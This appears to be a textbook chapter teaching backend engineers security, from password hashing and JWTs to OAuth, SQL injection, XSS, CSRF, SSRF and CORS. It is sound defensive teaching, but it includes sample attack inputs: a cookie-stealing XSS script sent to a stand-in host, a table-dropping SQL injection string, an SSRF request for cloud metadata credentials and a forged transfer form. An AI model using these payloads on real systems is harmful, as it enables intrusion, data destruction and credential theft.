# 15 — Security every backend engineer must know

Security comes up in every design review, usually as a few sharp questions: "how do users log
in?", "how does service A prove it is service A?", "what stops user 7 from reading user 8's
invoices?", "where do the secrets live?". This chapter gives you precise answers and the
reasoning behind them — identity, tokens, OAuth, encryption, the classic web vulnerabilities,
and the habits that prevent them. Precision matters here more than anywhere: a half-right
security claim is worse than saying "I'd check".

## 15.1 Authentication vs authorization

Two words that sound alike and mean different things:

- **Authentication (authn)**: **who are you?** Proving identity: a password, a token, a
  certificate, a fingerprint.
- **Authorization (authz)**: **what are you allowed to do?** Deciding whether this identity may
  perform this action on this resource.

```text
 request: "GET /invoices/981"  with token
     |
     v
 [ authentication ]  token valid? -> this is user 7          fails -> 401 Unauthorized
     |
     v
 [ authorization ]   may user 7 read invoice 981?            fails -> 403 Forbidden
     |                (does invoice 981 belong to user 7's account?)
     v
   handler returns invoice
```

HTTP status codes follow this split, with an unfortunate name: **401 Unauthorized** actually
means "not authenticated" (no or bad credentials), while **403 Forbidden** means "authenticated,
but not allowed". Some APIs return **404** instead of 403 for resources the caller may not see,
to avoid revealing that the resource exists.

> **Say it like this:** "Authentication establishes who the caller is — 401 if it fails.
> Authorization decides whether that identity can do this action on this specific resource —
> 403 if it fails. Broken authorization, not broken login, is one of the most common real bugs."

## 15.2 Storing passwords

The pain: your user table will leak someday (a backup copied to the wrong place, an SQL
injection, an insider). What is in that table decides whether attackers get millions of real
passwords — which people reuse on their email and bank.

### Never store plaintext; never use a plain fast hash

- **Plaintext**: leak = every password exposed. Obviously wrong.
- **Encryption**: the key lives near the data; whoever steals one often steals both. Passwords
  should never need to be decrypted, so do not make them decryptable.
- **Hashing** with a cryptographic hash (SHA-256): one-way, so better — but SHA-256 is designed
  to be **fast**. A single modern GPU computes billions of SHA-256 hashes per second. Attackers
  try every dictionary word, common password and variation against each hash. Most human
  passwords fall within hours. And without a salt, identical passwords produce identical hashes,
  so one precomputed table (a **rainbow table**) cracks everyone at once.

### Salt

A **salt** is a random value (e.g. 16 bytes), unique per user, generated at signup, stored next
to the hash, and mixed into the hash input. It is not secret. What it does:

- Two users with password `summer2026` get different hashes.
- Precomputed tables are useless: the attacker must attack each user separately.

A salt does not make guessing one user's password slower. For that you need a slow hash.

### Slow, purpose-built password hashing: bcrypt, scrypt, Argon2

These algorithms are deliberately expensive, with a tunable **work factor**, so verifying one
login costs, say, 50-250 ms of CPU. That is invisible to a user logging in once, but turns an
attacker's billions of guesses per second into thousands.

| Algorithm | Key idea | Notes |
|---|---|---|
| **bcrypt** | Tunable cost (iterations double per +1) | Old, battle-tested, widely available; only uses the first 72 bytes of the password |
| **scrypt** | CPU cost plus a large **memory** requirement | Memory-hardness makes GPU/ASIC cracking much more expensive |
| **Argon2id** | Tunable time, memory and parallelism | Argon2 won the Password Hashing Competition; the Argon2id variant is a common first recommendation today |

```text
 signup:  salt = random(16 bytes)
          stored = argon2id(password, salt, t=3, m=64MB, p=1)
          users table: (user_id, "$argon2id$v=19$m=65536,t=3,p=1$<salt>$<hash>")
                        -- the encoded string carries algorithm, parameters and salt

 login:   recompute with the stored salt and parameters, compare in constant time
```

Store the parameters with the hash so you can increase the cost over time (rehash on next
successful login). Some systems add a **pepper**: an extra secret mixed in, kept outside the
database (in a secrets manager or HSM), so a database-only leak is not enough to start cracking.

Also: rate-limit login attempts (chapter 12), support multi-factor authentication, and check new
passwords against lists of known-breached passwords.

> **Common mistake:** "We hash passwords with SHA-256 and a salt, so we're fine." A salt stops
> rainbow tables but not fast guessing. Use a deliberately slow password hash: Argon2id or scrypt
> (both also memory-hard), or bcrypt.

## 15.3 Sessions vs tokens

After login, the user should not send their password on every request. Two main ways to
remember them.

### Server-side sessions

The server creates a random, unguessable **session ID** (e.g. 128+ bits), stores `session_id ->
{user_id, expiry, ...}` in a shared store (Redis or a database), and sends the ID in a cookie.

```http
HTTP/1.1 200 OK
Set-Cookie: sid=Vb3k9...Qz; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

On each request, the browser sends the cookie; the server looks up the session. Cookie flags
matter:

- `HttpOnly`: JavaScript cannot read the cookie, so an XSS bug cannot steal it directly.
- `Secure`: only sent over HTTPS.
- `SameSite=Lax` or `Strict`: limits sending the cookie on cross-site requests (helps against
  CSRF, 15.10).

Pros: revocation is instant (delete the session row: "log out everywhere" works); the cookie
reveals nothing. Cons: a store lookup on every request (cheap with Redis); the store must be
highly available.

### Tokens and JWT

A **token** is a credential the client sends, typically in the `Authorization: Bearer <token>`
header. A **bearer token** means "whoever bears (holds) it can use it" — like cash, so it must be
protected in transit (TLS) and storage.

A **JWT (JSON Web Token)** is a common self-contained token format: three base64url-encoded parts
separated by dots: `header.payload.signature`.

```text
 eyJhbGciOiJSUzI1NiIsImtpZCI6ImsxIn0.eyJzdWIiOiI3IiwiZXhwIjoxNzkxNzEyOTIwfQ.kD8f...x2Q
 |------------ header ------------| |------- payload (shortened) -------| |-sig-|

 decoded (a real payload usually carries more claims, like these):
 header:   {"alg":"RS256","kid":"k1"}               algorithm, which key signed it
 payload:  {"iss":"https://auth.example.com",       issuer
            "sub":"7",                               subject = user id
            "aud":"orders-api",                      audience = who it is meant for
            "exp":1791712920, "iat":1791712020,      expiry, issued-at (epoch seconds)
            "scope":"orders:read"}                   claims (permissions etc.)
 signature: sign(base64url(header) + "." + base64url(payload), key)
```

What the signature **does**: proves the token was issued by someone holding the signing key and
that header and payload have not been changed. Any service with the verification key can check a
JWT locally, without calling the auth server or a session store. That is the main attraction.

- **HS256** (HMAC): one shared secret signs and verifies. Every verifier could also forge tokens.
- **RS256 / ES256** (asymmetric): the auth server signs with a private key; services verify with
  the public key (often fetched from a published key set, a **JWKS** endpoint). Verifiers cannot
  forge tokens. Preferred when many services verify.

What the signature **does not do**:

- It does **not encrypt**. Base64url is an encoding, not encryption; anyone holding the token
  can decode and read the payload. Never put secrets or sensitive personal data in it.
- It does not prove the token is still wanted (see revocation).

Verification checklist: check the signature with an **allowlisted algorithm** (never trust the
token's own `alg` blindly; historically some libraries accepted `"alg":"none"`, or were tricked
into verifying an RS256 token as HS256 using the public key as the secret), and check `exp`,
`iss`, and `aud`.

### The revocation problem

A JWT is valid until `exp`, no matter what. If a user logs out, changes their password, or a
token is stolen, the token keeps working, because services verify it locally without asking
anyone. Options:

- Keep access tokens **short-lived** (e.g. 5-15 minutes), so a stolen one expires soon.
- Keep a **denylist** of revoked token IDs (`jti` claim) checked on each request — which
  reintroduces a lookup, partly defeating the purpose.
- Track a per-user "tokens issued before time T are invalid" value.

### Access token + refresh token

The standard compromise:

```text
 login ---> auth server issues:
              access token:  short-lived (≈ 5-15 min), sent on every API call,
                             verified locally by each service
              refresh token: long-lived (days-weeks), sent ONLY to the auth server,
                             stored server-side so it can be revoked

 API call with expired access token -> 401
 client -> auth server: POST /token {refresh_token} -> server checks it is not revoked
        <- new access token (+ usually a NEW refresh token; old one invalidated:
           this is rotation)
```

Revocation now takes effect within one access-token lifetime: revoke the refresh token, and the
user is out within minutes. **Refresh token rotation** (each use returns a new refresh token)
also detects theft: if an old refresh token is used again, both the attacker and the real user
have it, so revoke the whole chain.

| | Server-side session | JWT access token |
|---|---|---|
| State | In a session store | In the token itself |
| Per-request cost | Store lookup | Signature check (CPU only) |
| Revocation | Instant | Hard; rely on short expiry |
| Size | Small ID | Larger (hundreds of bytes+) |
| Good fit | Browser web apps on one domain | APIs, mobile apps, many services verifying independently |

> **Say it like this:** "A JWT is signed, not encrypted — it proves who issued it and that it
> wasn't modified, and services can verify it without a lookup. The catch is revocation, so I'd
> use short-lived access tokens with server-side, rotating refresh tokens."

## 15.4 OAuth 2.0, OpenID Connect and SSO

### The problem OAuth solves

A photo-printing app wants to read your photos from a photo-hosting service. The bad old way:
give the printing app your photo-service password. Then it can do anything as you, forever, and
you cannot revoke it without changing your password.

**OAuth 2.0** is a framework for **delegated authorization**: the user lets an app access
specific resources on their behalf, with limited permissions (**scopes**), without sharing their
password, and can revoke it later.

The four **roles**:

| Role | In the example |
|---|---|
| **Resource owner** | You, the user |
| **Client** | The photo-printing app |
| **Authorization server** | The photo service's login/consent server that issues tokens |
| **Resource server** | The photo service's API that holds the photos |

### Authorization code flow with PKCE

This is the recommended flow for web apps, mobile apps and single-page apps. **PKCE** (Proof Key
for Code Exchange, pronounced "pixy") protects against an attacker who intercepts the
authorization code (for example via a malicious app registered for the same redirect URL on a
phone).

```text
 Browser/user        Client app            Authorization server     Resource server (API)
    |                   |                          |                          |
    | 1. "connect"      |                          |                          |
    |------------------>|                          |                          |
    |                   | 2. code_verifier = random secret                    |
    |                   |    code_challenge = BASE64URL(SHA256(verifier))     |
    | 3. redirect to    |                          |                          |
    |    auth server    |                          |                          |
    |<------------------|                          |                          |
    | GET /authorize?response_type=code&client_id&redirect_uri               |
    |   &scope=photos.read&state=xyz&code_challenge&code_challenge_method=S256|
    |--------------------------------------------->|                          |
    | 4. user logs in HERE and approves scopes     |                          |
    |<---------------------------------------------|                          |
    | 5. redirect: redirect_uri?code=AUTH_CODE&state=xyz                      |
    |------------------>|                          |                          |
    |                   | 6. check state == xyz    |                          |
    |                   | 7. POST /token           |                          |
    |                   |    code, code_verifier,  |                          |
    |                   |    redirect_uri,         |                          |
    |                   |    client_id (+ secret   |                          |
    |                   |    if confidential)      |                          |
    |                   |------------------------->| checks SHA256(verifier)  |
    |                   |                          | == code_challenge        |
    |                   | 8. access token          |                          |
    |                   |    (+ refresh token,     |                          |
    |                   |     + ID token if OIDC)  |                          |
    |                   |<-------------------------|                          |
    |                   | 9. GET /photos  Authorization: Bearer <access token>|
    |                   |---------------------------------------------------->|
    |                   | 10. photos               |                          |
    |                   |<----------------------------------------------------|
```

Why each piece exists:

- The user types their password **only at the authorization server**, never into the client.
- The browser only ever sees a short-lived, one-time **authorization code**, not the token. The
  token is fetched over a direct back-channel request in step 7.
- **PKCE**: an attacker who steals the code cannot redeem it without the `code_verifier`, which
  never left the client. Only its hash travelled through the browser.
- **state**: a random value tied to the user's session; checking it on return prevents an
  attacker from injecting their own authorization code into your session (a CSRF attack on the
  login flow).
- **Scopes** limit what the token can do (`photos.read`, not "everything").

Other flows you will hear of: **client credentials** (machine-to-machine, no user; the service
authenticates with its own credentials and gets a token), **device code** (TVs and CLIs that
cannot easily show a browser). The old **implicit flow** (token returned directly in the URL)
and the **password grant** (client collects the user's password) are discouraged.

### OpenID Connect (OIDC)

OAuth 2.0 is about **authorization** ("this app may read photos"). It does not standardize "who
is the user?". Using a raw access token as proof of login is a known mistake, because a token
issued to some other app could be replayed to yours.

**OpenID Connect** is an identity layer on top of OAuth 2.0 that adds **authentication**:

- The client requests the `openid` scope.
- The authorization server (now called an **OpenID provider**) returns an **ID token**: a JWT
  that states who the user is (`sub`), who issued it (`iss`), which client it is for (`aud`),
  when they authenticated, plus a `nonce` to prevent replay.
- A standard **userinfo** endpoint and discovery document.

"Sign in with <big provider>" buttons are OIDC.

| | OAuth 2.0 | OpenID Connect |
|---|---|---|
| Answers | What may this app access? | Who is this user? |
| Main output | Access token (for the resource server) | ID token (for the client) + access token |
| Audience of token | The API | The client app |

### SSO

**Single sign-on (SSO)** means logging in once at a central **identity provider (IdP)** and then
accessing many applications without logging in again. Each app redirects to the IdP; since the
user already has a session there, the IdP immediately sends back a fresh assertion for that app.
In companies this is typically done with **OIDC** or the older XML-based **SAML**. Benefits: one
place for MFA, password policy, and offboarding (disable one account, lose access everywhere).

## 15.5 API keys

An **API key** is a long random string that identifies a calling application (a developer's
project), typically for server-to-server access to public APIs.

```http
GET /v1/forecast?city=pune HTTP/1.1
Host: api.example.com
Authorization: Bearer sk_live_8f3b...     (or an X-API-Key header -- never in the URL)
```

Practices:

- Generate with a cryptographically secure random generator; at least 128 bits.
- Store only a **hash** of the key on the server (like a password, though a fast hash is fine
  here because keys are long and random, not guessable). Show the full key to the user once.
- A visible prefix (`sk_live_`, `pk_test_`) helps identify leaked keys in code scans.
- Scope keys (read-only vs write), support multiple keys per account and rotation, and attach
  rate limits and quotas to them (chapter 12).
- Keep keys out of URLs (they end up in logs, browser history and referrer headers).

API keys identify an application, not a user, and are long-lived; they are simpler than OAuth
but weaker. Do not embed secret keys in mobile apps or browser JavaScript: anything shipped to a
client can be extracted.

## 15.6 Service-to-service authentication

Inside your system, the payment service should accept calls only from services that are supposed
to call it. "It's on the internal network" is not enough: one compromised machine would then
have access to everything. The modern stance is **zero trust**: authenticate and authorize every
call, even inside the network.

Two common approaches:

- **mTLS (mutual TLS)**: in normal TLS only the server shows a certificate. In mTLS both sides do.
  Each service gets a certificate encoding its identity (e.g. `spiffe://prod/order-service`),
  issued and rotated automatically (a service mesh does this, chapter 12). The connection is
  encrypted and both ends know who they are talking to. Authorization policy then says "only
  order-service may call payment-service's `/charge`".
- **Signed tokens**: the calling service obtains a short-lived token (e.g. via the OAuth client
  credentials flow, or a platform-issued workload identity token) and sends it with each call;
  the receiver verifies signature, issuer, audience and expiry.

Often both: mTLS for the channel and service identity, plus a propagated token carrying the
**end user's** identity, so the payment service knows both "order-service is calling" and "on
behalf of user 7".

## 15.7 Authorization models

### RBAC

**Role-based access control**: permissions are attached to roles, and users are given roles.

```text
 roles:   viewer -> {invoice:read}
          editor -> {invoice:read, invoice:write}
          admin  -> {invoice:read, invoice:write, user:manage}
 user 7 has role editor in account 12  -> may read and write invoices in account 12
```

Simple, easy to audit ("who are the admins?"). Struggles with fine-grained rules ("may edit only
invoices they created, under 10,000, during business hours"), which lead to **role explosion**.

### ABAC

**Attribute-based access control**: decisions are rules over attributes of the user, the
resource, the action and the environment.

```text
 allow if user.department == resource.department
       and action == "approve"
       and resource.amount <= user.approval_limit
```

Very flexible; harder to reason about and audit. Often implemented with a central **policy
engine** that services query (or embed). A related model, **relationship-based access control
(ReBAC)**, decides access from a graph of relationships ("user is a member of team that owns
folder that contains doc") — the style used by many document-sharing systems.

### Ownership checks and IDOR

The most common authorization bug of all is simple. The endpoint:

```http
GET /api/invoices/981
Authorization: Bearer <token for user 7>
```

The handler loads invoice 981 and returns it. It checked that the user is logged in, but not
that invoice 981 belongs to user 7. User 7 changes the URL to 982, 983, ... and downloads
everyone's invoices. This is an **IDOR (insecure direct object reference)**: the object
reference comes straight from the client and access to that specific object is not checked.

Fixes:

```sql
-- scope every query by the caller's tenant/owner, not just by id.
-- account_id comes from the verified token, never from the request.
SELECT * FROM invoices WHERE id = ? AND account_id = ?;
```

- Enforce the check on the **server**, for every object, on every endpoint (including update,
  delete, export, and bulk endpoints).
- Centralize it (a data-access layer that always applies the tenant filter, or row-level
  security in the database) rather than relying on every handler remembering.
- Random, unguessable IDs (UUIDs) make enumeration harder but are **not** an access check.
  Leaked or shared IDs still work.

> **Say it like this:** "Every data access is scoped by the caller's identity on the server: we
> take the account ID from the verified token and include it in the query, so changing an ID in
> the URL can't reach another tenant's data. Unguessable IDs are a bonus, not the control."

## 15.8 Encryption in transit and at rest, keys and secrets

### In transit: TLS recap

**TLS** (chapter 01) encrypts data between two endpoints and authenticates the server with a
certificate signed by a trusted certificate authority. It protects against eavesdropping and
tampering on the network. Use it for everything public, and increasingly for internal traffic as
well (mTLS, 15.6). Where TLS terminates at a load balancer, decide whether the hop to the backend
is re-encrypted; on shared or untrusted networks it should be.

### At rest

**Encryption at rest** means data stored on disk (databases, object storage, backups) is
encrypted, so a stolen disk, snapshot or misplaced backup file is unreadable without the key.
Levels:

- **Disk/volume level**: transparent; protects against physical theft and some snapshot leaks,
  but anyone who can query the running database sees plaintext.
- **Database/storage service level**: similar, managed by the service.
- **Application-level (field-level)**: the app encrypts specific fields (national ID numbers)
  before storing them. Protects even against someone with database read access, but you lose
  the ability to query or index those fields directly.

### Key management and envelope encryption

Encryption is only as good as the protection of the keys. A **KMS (key management service)** or
**HSM (hardware security module)** holds master keys in hardware or a hardened service; the keys
never leave it; you ask it to encrypt or decrypt small pieces of data, and every use is
access-controlled and logged.

But you cannot send terabytes to the KMS. **Envelope encryption** solves this:

```text
 encrypt:
   1. generate a random data key (DEK) locally
   2. encrypt the data with the DEK (fast, local, e.g. AES-GCM)
   3. ask the KMS to encrypt the DEK with the master key (KEK, never leaves the KMS)
   4. store: [ encrypted data | encrypted DEK ]; throw away the plaintext DEK

 decrypt:
   1. send encrypted DEK to the KMS -> get plaintext DEK (if you are authorized)
   2. decrypt the data locally with it

   +---------------------- stored object ----------------------+
   |  ciphertext (encrypted with DEK)  |  DEK encrypted by KEK  |
   +-----------------------------------+------------------------+
                                         (the KEK itself lives only inside the KMS)
```

Why it works: bulk encryption is fast and local; the master key is never exposed; rotating the
master key only requires re-encrypting the small DEKs, not all the data; and revoking KMS access
makes the data unreadable.

### Secrets management

**Secrets** are database passwords, API keys, signing keys, certificates. Rules:

- **Never in code or in the repository.** Git history keeps them forever, and repositories get
  copied, forked and leaked. Automated scanners find committed keys within minutes of a public
  push.
- Store them in a **secrets manager** (a vault service or the cloud provider's secret store):
  encrypted, access-controlled per service, audited.
- Inject at runtime (mounted files or environment variables fetched at startup), with the app's
  own identity used to fetch them.
- **Rotate** regularly and immediately after any suspected leak; prefer short-lived, dynamically
  generated credentials (the vault creates a database user valid for one hour).
- Do not log them; scrub them from error messages and crash dumps.

## 15.9 Injection: SQL injection

The pain: building queries by string concatenation with user input.

```text
 code:   query = "SELECT * FROM users WHERE email = '" + email + "'"
 input:  email = ' OR '1'='1
 result: SELECT * FROM users WHERE email = '' OR '1'='1'      -> returns every user

 input:  email = '; DROP TABLE users; --
 result: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
```

The attacker's input is interpreted as **code** (SQL) instead of **data**.

The fix is **parameterized queries** (prepared statements): the query structure is sent
separately from the values, so values can never change the structure.

```sql
SELECT * FROM users WHERE email = ?;     -- value bound separately: always treated as data
```

Notes:

- ORMs parameterize by default, but "raw query" helpers with string interpolation reintroduce
  the bug.
- Parameters cannot replace identifiers (table or column names, sort direction). For those, map
  user input to an **allowlist** of known values (`sort=price` -> `ORDER BY price`).
- Escaping by hand is fragile; do not rely on it.
- Least privilege (15.13) limits damage: the app's DB user should not be able to drop tables.

The same class of bug exists wherever input is concatenated into an interpreter: OS commands
(command injection), LDAP, NoSQL query objects, template engines. Same cure: separate code from
data.

## 15.10 XSS and CSRF

### XSS (cross-site scripting)

The attacker gets their JavaScript to run in **another user's browser** on **your site**. For
example a comment containing `<script>fetch('https://evil.example/?c='+document.cookie)</script>`
is stored and rendered into the page for every visitor. That script runs with your site's
privileges: it can read the page, act as the user, and steal non-HttpOnly tokens.

Kinds: **stored** (saved in your DB and served to others), **reflected** (bounced from a URL
parameter into the response), **DOM-based** (client-side JS writes untrusted data into the page).

Prevention:

- **Context-aware output encoding**: when inserting user data into HTML, encode `<`, `>`, `&`,
  `"`, `'`. Modern template engines and front-end frameworks escape by default; the danger is the
  escape hatches (`innerHTML`, "raw HTML" helpers).
- If you must accept rich HTML, sanitize it with a well-maintained allowlist sanitizer.
- **Content Security Policy (CSP)** header: tells the browser which script sources are allowed,
  blocking injected inline scripts. A strong second layer of defense.
- **HttpOnly cookies** so session cookies cannot be read by injected scripts (the script can
  still make requests as the user, so this limits but does not prevent damage).

### CSRF (cross-site request forgery)

The attacker tricks a logged-in user's browser into sending a request to your site. Because
browsers automatically attach cookies to requests for your domain, the request arrives
authenticated.

```text
 user is logged into bank.example (session cookie in browser)
 user visits evil.example, which contains:
   <form action="https://bank.example/transfer" method="POST">
     <input name="to" value="attacker"> <input name="amount" value="1000">
   </form>
   <script>document.forms[0].submit()</script>
 browser sends POST to bank.example WITH the bank's session cookie -> transfer happens
```

The attacker cannot read the response — they do not need to; the side effect already happened.

Prevention:

- **SameSite cookies**: `SameSite=Lax` (cookie not sent on cross-site POSTs; Chromium-based
  browsers apply Lax when the attribute is missing) or `Strict`. A strong baseline, but set it
  explicitly rather than relying on browser defaults.
- **Anti-CSRF tokens**: a random token tied to the session, embedded in forms and checked by the
  server; the attacker's page cannot read it, so it cannot include it.
- Never perform state changes on GET.
- APIs that authenticate with an `Authorization` header (not cookies) are not exposed to classic
  CSRF, because browsers do not attach that header automatically.

| | XSS | CSRF |
|---|---|---|
| Attacker achieves | Their code runs on your site in victim's browser | Victim's browser sends a forged request to your site |
| Abuses | Your site's trust in user content | Your site's trust in the browser's cookies |
| Main defense | Output encoding, CSP, sanitization | SameSite cookies, CSRF tokens |

## 15.11 SSRF and broken access control

### SSRF (server-side request forgery)

Your server fetches a URL supplied by the user: "import image from URL", webhooks, link
previews, PDF renderers. The attacker supplies an **internal** URL:

```text
 POST /import  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
 your server fetches it from INSIDE the network -> cloud credentials go to the attacker

 other targets: http://localhost:8080/admin, http://10.0.3.17:6379 (internal Redis), ...
```

The server becomes the attacker's proxy into your internal network, which is often trusted and
unauthenticated. `169.254.169.254` is the cloud instance metadata address, which on some setups
returns temporary credentials for the machine's role.

Prevention:

- **Allowlist** destinations when possible (only these partner domains).
- Otherwise, resolve the hostname and **block private, loopback, link-local and metadata
  ranges** — and check the IP you actually connect to (attackers use DNS that resolves to a safe
  IP first and an internal one later, **DNS rebinding**, and redirects to internal addresses).
- Run URL fetching in an isolated service with no access to internal networks (egress proxy).
- Use metadata-service protections that require a session token (harder to reach via simple
  SSRF).
- Do not return raw fetched content or detailed errors to the user.

### Broken access control

The broad category that covers IDOR (15.7) and more; it is consistently at or near the top of
web vulnerability rankings. Examples:

- Missing ownership checks (IDOR).
- Admin endpoints protected only by hiding the button in the UI.
- Changing `"role": "admin"` in a request body and the server accepting it (**mass assignment**:
  binding all request fields to the model). Fix: explicit allowlists of updatable fields.
- Checks applied on `GET` but forgotten on `PUT`/`DELETE` or the bulk export endpoint.
- Trusting client-supplied identity (`X-User-Id` header) at a service reachable from outside.

Principle: **deny by default**, enforce on the server, centralize checks, and write tests that
try to access other users' resources.

## 15.12 CORS, explained correctly

Background: the **same-origin policy** (SOP) is a browser rule. A script on
`https://evil.example` may **send** requests to `https://bank.example`, but the browser will not
let the script **read** the response. An **origin** is scheme + host + port.

Sometimes you legitimately want cross-origin reads: your front end at `https://app.example.com`
calls your API at `https://api.example.com`. **CORS (cross-origin resource sharing)** is the
mechanism by which the server tells the browser "it is OK to let these origins read my
responses".

```text
 browser at https://app.example.com  ---- GET https://api.example.com/me ---->  API
                                     <--- 200, Access-Control-Allow-Origin:
                                               https://app.example.com  ------
 browser: origin matches the header -> script may read the response
 (if the header were missing: request still happened, response blocked from the SCRIPT)
```

For non-"simple" requests (e.g. `PUT`, `DELETE`, JSON content type, custom headers), the browser
first sends a **preflight** `OPTIONS` request asking permission; the actual request is sent only
if the server's response allows that origin, method and headers.

```http
OPTIONS /orders/42 HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: DELETE

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
```

What CORS is **not**:

- **Not a server-side security boundary.** It is enforced by the **browser**, on behalf of the
  user. `curl`, scripts, mobile apps and attackers' servers ignore it entirely. Your API must
  still authenticate and authorize every request.
- **Not CSRF protection.** Simple requests (like a form POST) are sent before any CORS check;
  CORS only decides whether the response can be read.
- It **relaxes** the same-origin policy; it never makes things stricter.

Configuration pitfalls: reflecting any `Origin` header back while also sending
`Access-Control-Allow-Credentials: true` lets any website make authenticated reads of your users'
data. Browsers refuse the wildcard `*` together with credentials, which is why people reflect the
origin — and why you should check it against an explicit allowlist.

> **Say it like this:** "CORS is the browser asking the server whether a page from another origin
> may read the response. It protects users' browsers, not our server — curl ignores it — so the
> API still has to authenticate and authorize everything, and we allowlist origins rather than
> reflecting them."

> **Common mistake:** "We're safe from that attacker because we configured CORS." CORS does not
> stop any non-browser client, and does not stop the request from being sent.

## 15.13 Input validation and least privilege

### Input validation

Treat every input as untrusted: request bodies, headers, query strings, uploaded files, webhook
payloads, even messages from other internal services and data read back from your own database
if it originally came from users.

- **Validate on the server** (client-side validation is for UX only; attackers skip it).
- Prefer **allowlists** (what is permitted: type, length, range, format, enum) over denylists
  (trying to list every bad thing).
- Enforce size limits: body size, string length, array length, file size, upload types (check
  content, not just the extension), JSON nesting depth.
- Validation is not a substitute for **output encoding** and **parameterized queries**: valid
  input can still be dangerous in a different context (an O'Brien in a SQL string). Encode for
  the context where data is used.

### Least privilege

Every user, service and process gets only the permissions it needs, nothing more:

- The web app's database user can `SELECT/INSERT/UPDATE` its own tables, not `DROP` or access
  other schemas.
- A service's cloud role can read one storage bucket, not all of them.
- Admin access is granted just-in-time, time-limited, and logged.
- Containers run as non-root with read-only file systems where possible.
- Network policies only allow the connections a service actually needs.

The point is to limit the **blast radius**: when (not if) something is compromised, the attacker
inherits only that component's narrow permissions. Combined with multiple independent controls
(network rules + authentication + authorization + encryption), this is **defense in depth**.

## 15.14 DDoS basics and mitigation layers

A **DoS (denial of service)** attack tries to make a service unavailable. A **DDoS (distributed
DoS)** comes from many sources at once (often a botnet of compromised devices), so blocking one IP
does not help.

Types by layer:

| Type | Example | Targets |
|---|---|---|
| Volumetric (L3/L4) | UDP floods, amplification attacks: small spoofed requests to open DNS/NTP servers trigger large responses to the victim | Network bandwidth |
| Protocol (L4) | SYN floods: half-open TCP connections fill connection tables | Load balancers, firewalls, server connection state |
| Application (L7) | Huge numbers of legitimate-looking HTTP requests to expensive endpoints (search, login) | App servers, databases |

Mitigation is layered, outermost first:

```text
 attack traffic
    |
    v
 [ anycast network / CDN edge ]  huge distributed capacity absorbs volumetric floods;
    |                            cached content served without touching origin
    v
 [ DDoS scrubbing / provider ]   filters SYN floods, malformed packets, known bad sources
    |
    v
 [ WAF ]                         web application firewall: L7 rules, bot detection,
    |                            challenges, blocks known attack patterns
    v
 [ API gateway rate limits ]     per IP / per key / per endpoint limits (chapter 12)
    |
    v
 [ app: load shedding, caching, ]  survive what gets through; cheap rejections;
 [ autoscaling with max limits  ]  never let an expensive query be unlimited
    |
    v
 origin hidden: accepts traffic only from the CDN/WAF, so attackers can't skip the layers
```

Key ideas: you cannot out-provision a large volumetric attack with your own servers, so absorb it
at a provider with massive edge capacity; keep origin IPs hidden; make expensive operations
cheap to reject (cache, require auth, rate limit); and have a runbook ready before the attack.

## 15.15 Audit logging

An **audit log** is a record of security-relevant actions: who did what, to which resource,
when, from where, and with what result.

```text
 {"ts":"2026-10-10T09:14:03Z","actor":"user:7","actor_ip":"203.0.113.9",
  "action":"invoice.export","resource":"account:12","result":"success",
  "request_id":"r-5f2c..."}
```

What to audit: logins and failed logins, permission and role changes, access to sensitive data,
admin actions, configuration and key changes, data exports and deletions.

Properties that make audit logs useful:

- **Tamper-resistant**: append-only, written to a separate system that the audited actors cannot
  modify (even admins), ideally with integrity checks.
- **Complete and consistent** across services (same fields, synchronized clocks).
- **Retained** for the period required by policy and regulation.
- **Not leaking secrets**: no passwords or tokens in the log, careful with personal data.
- **Used**: alerting on suspicious patterns (mass exports, many failed logins, privilege
  escalation).

Audit logs differ from debug logs: they are a security and compliance record, not a debugging
aid, and are kept with stronger guarantees.

## 15.16 PII and data privacy basics

**PII (personally identifiable information)** is data that identifies a person directly (name,
email, phone, government ID) or in combination (birth date + postcode + gender). Privacy laws
such as GDPR in the EU and similar laws elsewhere give people rights over their data and put
obligations on companies. Engineering consequences:

- **Data minimization**: do not collect what you do not need. Data you never stored cannot leak.
- **Purpose limitation and retention**: keep data only as long as needed; build deletion jobs
  and TTLs from the start.
- **Right to access and deletion**: you must be able to find all of a user's data across
  services, logs, analytics stores, caches and backups, and delete or export it. This is a
  design problem: track where PII flows.
- **Classify data** (public, internal, confidential, restricted) and apply controls per class.
- **Protect it**: encryption in transit and at rest, field-level encryption for the most
  sensitive fields, strict access control, audit logs of access.
- **Pseudonymization**: replace direct identifiers with tokens or IDs in analytics and logs;
  keep the mapping in a protected store.
- **Masking**: show `****1234` instead of full numbers in UIs and logs.
- **Data residency**: some data must stay in a particular country or region, which affects
  multi-region designs (chapter 14).
- Payment card data has its own strict standard (PCI DSS); a common approach is to let a
  payment provider handle card numbers so they never touch your systems.

> **Say it like this:** "For PII I'd minimize what we collect, encrypt it at rest with
> KMS-managed keys, keep it out of logs and analytics via pseudonymous IDs, and keep a map of
> where it lives so we can honor deletion requests across every store, including backups."

## 15.17 Recap

- Authentication = who you are (401); authorization = what you may do (403). Authorization
  bugs are among the most common real vulnerabilities.
- Passwords: per-user salt plus a deliberately slow hash (Argon2id or scrypt, both memory-hard;
  or bcrypt) — never plain SHA-256.
- Sessions: random ID in an HttpOnly, Secure, SameSite cookie, state in a store; instantly
  revocable.
- JWT = header.payload.signature: signed, not encrypted; verify algorithm, signature, exp, iss,
  aud; revocation is hard, so use short access tokens plus rotating refresh tokens.
- OAuth 2.0 = delegated authorization; authorization code + PKCE is the standard flow; OIDC adds
  the ID token for authentication; SSO centralizes login at an IdP.
- API keys identify applications: random, hashed at rest, scoped, rotatable, never in URLs or
  client apps.
- Service-to-service: zero trust with mTLS and/or signed short-lived tokens.
- RBAC for roles, ABAC/ReBAC for fine-grained rules; always scope data access by owner/tenant on
  the server (IDOR).
- TLS in transit, encryption at rest, envelope encryption with a KMS, secrets in a secrets
  manager, never in code.
- SQL injection -> parameterized queries; XSS -> output encoding + CSP; CSRF -> SameSite + tokens;
  SSRF -> allowlists and blocking internal ranges.
- CORS is browser-enforced relaxation of the same-origin policy, not a server security boundary.
- Validate input with allowlists, apply least privilege, layer DDoS defenses (CDN/anycast, WAF,
  rate limits), keep tamper-resistant audit logs, and minimize and protect PII.

## 15.18 Check yourself

1. A teammate proposes storing passwords as SHA-256(salt + password). What is right, what is
   wrong, and what do you suggest?

